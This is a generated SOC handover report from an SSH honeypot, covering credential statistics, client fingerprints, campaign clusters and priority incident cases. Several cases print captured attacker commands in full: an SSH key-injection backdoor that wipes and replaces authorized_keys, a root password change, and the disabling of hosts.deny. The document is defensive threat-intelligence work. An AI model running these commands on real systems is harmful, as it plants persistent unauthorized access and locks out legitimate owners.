# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-07 |
| **Generated At** | 2026-06-07T09:19:53Z |
| **Shift Time** | 09:19 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **454** |
| Confirmed Threats | **440** |
| False Positives Filtered | **14** (3.1%) |
| Unique Attacker IPs | **39** |
| Countries of Origin | **15** |
| High Severity Cases | **19** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **435** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **38** |
| Unique Credential Pairs | **24** |
| Unique Usernames | **13** |
| Unique Passwords | **24** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 19 |
| `345gs5662d34` | 8 |
| `magento` | 1 |
| `mqtt` | 1 |
| `marc` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 7 |
| `` | 2 |
| `magento@123` | 1 |
| `mqtt123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `root` | `3245gs5662d34` | 7 |
| `root` | `` | 2 |
| `magento` | `magento@123` | 1 |
| `mqtt` | `mqtt123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Ab654321` | `171.244.143.209` | 2026-06-07T04:36:40 |
| `root` | `3245gs5662d34` | `171.244.143.209` | 2026-06-07T04:36:43 |
| `root` | `P@ssw0rd.123` | `202.29.225.206` | 2026-06-07T05:30:17 |
| `root` | `3245gs5662d34` | `202.29.225.206` | 2026-06-07T05:30:22 |
| `root` | `dongdong` | `202.29.225.206` | 2026-06-07T05:32:31 |
| `root` | `s` | `202.29.225.206` | 2026-06-07T05:34:44 |
| `root` | `cnp200@HW` | `171.244.143.209` | 2026-06-07T05:44:24 |
| `root` | `Admin@123!@#` | `202.29.225.206` | 2026-06-07T05:45:50 |
| `root` | `ABC@123456` | `180.153.91.15` | 2026-06-07T06:50:32 |
| `root` | `ubuntu` | `151.246.238.104` | 2026-06-07T07:30:45 |
| `root` | `` | `34.44.87.1` | 2026-06-07T08:06:17 |
| `root` | `` | `162.216.17.62` | 2026-06-07T08:11:24 |
| `root` | `sjvns_161AFBI98416513svjn` | `162.216.17.62` | 2026-06-07T08:17:21 |
| `root` | `7ujm^YHN` | `187.33.59.116` | 2026-06-07T09:18:06 |
| `root` | `3245gs5662d34` | `187.33.59.116` | 2026-06-07T09:18:13 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **454** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 42 |
| OpenSSH | 3 |
| Go SSH scanner | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 32 | 5 |
| `03a80b21afa8...` | Modern SSH client | 4 | 2 |
| `eeca2460550b...` | libssh-based | 2 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `7216c7c47391...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 32 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 4 | — |
| `03a80b21afa8...` | libssh | 4 | 2 | Modern SSH client |
| `eeca2460550b...` | OpenSSH | 2 | 1 | libssh-based |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `7216c7c47391...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `e1d88fdd485f...` | OpenSSH | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **XMRig Miner Deploy** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1496` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 1 | 1 | `T1078, T1083, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · XMRig Miner Deploy**

> Cryptominer deployment. Downloads and executes XMRig against known mining pools.

Representative commands:
```
ls
```
```
ls /home
```
```
ls /home/phil
```
```
sudo apt update
```
```
sudo apt update
```
Source IPs: `162.216.17.62`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:HqvAVDewsuCk"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.153.91.15`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
ls
```
```
passwd
```
```
clear
```
```
echo "=== OS ==="; cat /etc/os-release; echo "=== uname ==="; uname -a; echo "=== hostname ==="; hostname; echo "=== uptime ==="; uptime; echo "=== free ==="; free -h; echo "=== meminfo ==="; cat /proc/meminfo; echo "=== top ==="; top -n 1 -b | head -10; echo "=== lscpu ==="; lscpu; echo "=== cpu model ==="; cat /proc/cpuinfo | grep "model name" | head -1; echo "=== nproc ==="; nproc; echo "=== df ==="; df -h; echo "=== lsblk ==="; lsblk; echo "=== mount ==="; mount | column -t; echo "=== who ==="; who; ech
```
```
clear
```
Source IPs: `162.216.17.62`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **39** |
| Unique ASNs | **27** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | LOW |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS23724` | IDC, China Telecommunications Corporation | 2 | HIGH |
| `AS34369` | Aria Shatel PJSC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (16)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-017265e578be

| Field | Detail |
|---|---|
| **Source IP** | `171.244.143[.]209` |
| **First Seen** | 2026-06-07 04:36 |
| **Last Seen** | 2026-06-07 04:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 04:36:40` | `cowrie.session.connect` |
| `2026-06-07 04:36:40` | `cowrie.client.version` |
| `2026-06-07 04:36:40` | `cowrie.client.kex` |
| `2026-06-07 04:36:40` | `cowrie.login.success` |
| `2026-06-07 04:36:40` | `cowrie.session.params` |
| `2026-06-07 04:36:40` | `cowrie.command.input` |
| `2026-06-07 04:36:40` | `cowrie.command.failed` |
| `2026-06-07 04:36:41` | `cowrie.log.closed` |
| `2026-06-07 04:36:41` | `cowrie.session.params` |
| `2026-06-07 04:36:41` | `cowrie.command.input` |
| `2026-06-07 04:36:41` | `cowrie.session.file_download` |
| `2026-06-07 04:36:41` | `cowrie.log.closed` |
| `2026-06-07 04:36:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.143[.]209` to AbuseIPDB if not already reported
- [ ] Block `171.244.143[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7edd2e86456a

| Field | Detail |
|---|---|
| **Source IP** | `171.244.143[.]209` |
| **First Seen** | 2026-06-07 04:36 |
| **Last Seen** | 2026-06-07 04:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 04:36:43` | `cowrie.session.connect` |
| `2026-06-07 04:36:43` | `cowrie.client.version` |
| `2026-06-07 04:36:43` | `cowrie.client.kex` |
| `2026-06-07 04:36:43` | `cowrie.login.success` |
| `2026-06-07 04:36:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.143[.]209` to AbuseIPDB if not already reported
- [ ] Block `171.244.143[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20692f6528d5

| Field | Detail |
|---|---|
| **Source IP** | `202.29.225[.]206` |
| **First Seen** | 2026-06-07 05:30 |
| **Last Seen** | 2026-06-07 05:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 05:30:16` | `cowrie.session.connect` |
| `2026-06-07 05:30:16` | `cowrie.client.version` |
| `2026-06-07 05:30:16` | `cowrie.client.kex` |
| `2026-06-07 05:30:17` | `cowrie.login.success` |
| `2026-06-07 05:30:18` | `cowrie.session.params` |
| `2026-06-07 05:30:18` | `cowrie.command.input` |
| `2026-06-07 05:30:18` | `cowrie.command.failed` |
| `2026-06-07 05:30:18` | `cowrie.log.closed` |
| `2026-06-07 05:30:18` | `cowrie.session.params` |
| `2026-06-07 05:30:18` | `cowrie.command.input` |
| `2026-06-07 05:30:19` | `cowrie.session.file_download` |
| `2026-06-07 05:30:19` | `cowrie.log.closed` |
| `2026-06-07 05:30:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.29.225[.]206` to AbuseIPDB if not already reported
- [ ] Block `202.29.225[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f48bad932dec

| Field | Detail |
|---|---|
| **Source IP** | `202.29.225[.]206` |
| **First Seen** | 2026-06-07 05:30 |
| **Last Seen** | 2026-06-07 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 05:30:21` | `cowrie.session.connect` |
| `2026-06-07 05:30:21` | `cowrie.client.version` |
| `2026-06-07 05:30:22` | `cowrie.client.kex` |
| `2026-06-07 05:30:22` | `cowrie.login.success` |
| `2026-06-07 05:30:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.29.225[.]206` to AbuseIPDB if not already reported
- [ ] Block `202.29.225[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-397b8f0504ac

| Field | Detail |
|---|---|
| **Source IP** | `202.29.225[.]206` |
| **First Seen** | 2026-06-07 05:32 |
| **Last Seen** | 2026-06-07 05:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 05:32:30` | `cowrie.session.connect` |
| `2026-06-07 05:32:30` | `cowrie.client.version` |
| `2026-06-07 05:32:30` | `cowrie.client.kex` |
| `2026-06-07 05:32:31` | `cowrie.login.success` |
| `2026-06-07 05:32:31` | `cowrie.session.params` |
| `2026-06-07 05:32:31` | `cowrie.command.input` |
| `2026-06-07 05:32:31` | `cowrie.command.failed` |
| `2026-06-07 05:32:32` | `cowrie.log.closed` |
| `2026-06-07 05:32:32` | `cowrie.session.params` |
| `2026-06-07 05:32:32` | `cowrie.command.input` |
| `2026-06-07 05:32:32` | `cowrie.session.file_download` |
| `2026-06-07 05:32:32` | `cowrie.log.closed` |
| `2026-06-07 05:32:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.29.225[.]206` to AbuseIPDB if not already reported
- [ ] Block `202.29.225[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e66a114afa3

| Field | Detail |
|---|---|
| **Source IP** | `202.29.225[.]206` |
| **First Seen** | 2026-06-07 05:32 |
| **Last Seen** | 2026-06-07 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 05:32:35` | `cowrie.session.connect` |
| `2026-06-07 05:32:35` | `cowrie.client.version` |
| `2026-06-07 05:32:35` | `cowrie.client.kex` |
| `2026-06-07 05:32:36` | `cowrie.login.success` |
| `2026-06-07 05:32:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.29.225[.]206` to AbuseIPDB if not already reported
- [ ] Block `202.29.225[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bb06f64e265

| Field | Detail |
|---|---|
| **Source IP** | `202.29.225[.]206` |
| **First Seen** | 2026-06-07 05:34 |
| **Last Seen** | 2026-06-07 05:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 05:34:43` | `cowrie.session.connect` |
| `2026-06-07 05:34:43` | `cowrie.client.version` |
| `2026-06-07 05:34:43` | `cowrie.client.kex` |
| `2026-06-07 05:34:44` | `cowrie.login.success` |
| `2026-06-07 05:34:44` | `cowrie.session.params` |
| `2026-06-07 05:34:44` | `cowrie.command.input` |
| `2026-06-07 05:34:44` | `cowrie.command.failed` |
| `2026-06-07 05:34:45` | `cowrie.log.closed` |
| `2026-06-07 05:34:45` | `cowrie.session.params` |
| `2026-06-07 05:34:45` | `cowrie.command.input` |
| `2026-06-07 05:34:45` | `cowrie.session.file_download` |
| `2026-06-07 05:34:45` | `cowrie.log.closed` |
| `2026-06-07 05:34:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.29.225[.]206` to AbuseIPDB if not already reported
- [ ] Block `202.29.225[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-075355ee385c

| Field | Detail |
|---|---|
| **Source IP** | `202.29.225[.]206` |
| **First Seen** | 2026-06-07 05:34 |
| **Last Seen** | 2026-06-07 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 05:34:48` | `cowrie.session.connect` |
| `2026-06-07 05:34:48` | `cowrie.client.version` |
| `2026-06-07 05:34:48` | `cowrie.client.kex` |
| `2026-06-07 05:34:49` | `cowrie.login.success` |
| `2026-06-07 05:34:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.29.225[.]206` to AbuseIPDB if not already reported
- [ ] Block `202.29.225[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f37f706294ac

| Field | Detail |
|---|---|
| **Source IP** | `171.244.143[.]209` |
| **First Seen** | 2026-06-07 05:44 |
| **Last Seen** | 2026-06-07 05:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 05:44:24` | `cowrie.session.connect` |
| `2026-06-07 05:44:24` | `cowrie.client.version` |
| `2026-06-07 05:44:24` | `cowrie.client.kex` |
| `2026-06-07 05:44:24` | `cowrie.login.success` |
| `2026-06-07 05:44:24` | `cowrie.session.params` |
| `2026-06-07 05:44:24` | `cowrie.command.input` |
| `2026-06-07 05:44:24` | `cowrie.command.failed` |
| `2026-06-07 05:44:25` | `cowrie.log.closed` |
| `2026-06-07 05:44:25` | `cowrie.session.params` |
| `2026-06-07 05:44:25` | `cowrie.command.input` |
| `2026-06-07 05:44:25` | `cowrie.session.file_download` |
| `2026-06-07 05:44:25` | `cowrie.log.closed` |
| `2026-06-07 05:44:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.143[.]209` to AbuseIPDB if not already reported
- [ ] Block `171.244.143[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52c3d77ef00f

| Field | Detail |
|---|---|
| **Source IP** | `171.244.143[.]209` |
| **First Seen** | 2026-06-07 05:44 |
| **Last Seen** | 2026-06-07 05:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 05:44:26` | `cowrie.session.connect` |
| `2026-06-07 05:44:26` | `cowrie.client.version` |
| `2026-06-07 05:44:27` | `cowrie.client.kex` |
| `2026-06-07 05:44:27` | `cowrie.login.success` |
| `2026-06-07 05:44:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.143[.]209` to AbuseIPDB if not already reported
- [ ] Block `171.244.143[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e97cdf969b16

| Field | Detail |
|---|---|
| **Source IP** | `202.29.225[.]206` |
| **First Seen** | 2026-06-07 05:45 |
| **Last Seen** | 2026-06-07 05:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 05:45:49` | `cowrie.session.connect` |
| `2026-06-07 05:45:49` | `cowrie.client.version` |
| `2026-06-07 05:45:49` | `cowrie.client.kex` |
| `2026-06-07 05:45:50` | `cowrie.login.success` |
| `2026-06-07 05:45:50` | `cowrie.session.params` |
| `2026-06-07 05:45:50` | `cowrie.command.input` |
| `2026-06-07 05:45:50` | `cowrie.command.failed` |
| `2026-06-07 05:45:51` | `cowrie.log.closed` |
| `2026-06-07 05:45:51` | `cowrie.session.params` |
| `2026-06-07 05:45:51` | `cowrie.command.input` |
| `2026-06-07 05:45:51` | `cowrie.session.file_download` |
| `2026-06-07 05:45:51` | `cowrie.log.closed` |
| `2026-06-07 05:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.29.225[.]206` to AbuseIPDB if not already reported
- [ ] Block `202.29.225[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a13ce5b08aaf

| Field | Detail |
|---|---|
| **Source IP** | `202.29.225[.]206` |
| **First Seen** | 2026-06-07 05:45 |
| **Last Seen** | 2026-06-07 05:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 05:45:54` | `cowrie.session.connect` |
| `2026-06-07 05:45:54` | `cowrie.client.version` |
| `2026-06-07 05:45:54` | `cowrie.client.kex` |
| `2026-06-07 05:45:55` | `cowrie.login.success` |
| `2026-06-07 05:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.29.225[.]206` to AbuseIPDB if not already reported
- [ ] Block `202.29.225[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36ef6295a8ec

| Field | Detail |
|---|---|
| **Source IP** | `180.153.91[.]15` |
| **First Seen** | 2026-06-07 06:50 |
| **Last Seen** | 2026-06-07 06:50 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
